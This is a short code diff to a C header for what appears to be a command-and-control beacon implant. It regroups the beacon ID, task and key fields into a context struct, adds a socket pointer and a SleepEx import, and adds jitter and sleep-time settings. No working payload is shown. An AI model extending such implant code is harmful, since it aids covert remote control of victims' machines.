@@ -20,9 +20,14 @@
 typedef struct
 {
 	BOOL	IsOnline;
-	ULONG	BeaconId;
-	ULONG	LastTask;
-	UCHAR	BeaconKeys[ 16 ];
+
+	struct
+	{
+		ULONG BeaconId;
+		ULONG LastTask;
+		PVOID Socket;
+		UCHAR BeaconKeys[16];
+	} ctx;
 
 	struct
 	{
@@ -39,6 +44,7 @@ typedef struct
 		FUNC( wcslen );
 		FUNC( GetACP );
 		FUNC( wcsrchr );
+		FUNC( SleepEx );
 		FUNC( wcstombs );
 		FUNC( GetOEMCP );
 		FUNC( LocalLock );
@@ -79,6 +85,12 @@ typedef struct
 		FUNC( CryptAcquireContextA );
 		FUNC( CryptImportPublicKeyInfo );
 	} api;
+
+	struct
+	{
+		ULONG Jitter;
+		ULONG SleepTime;
+	} setting;
 
 	PVOID	Module[ 3 ];
 	SOCKET	Socket;
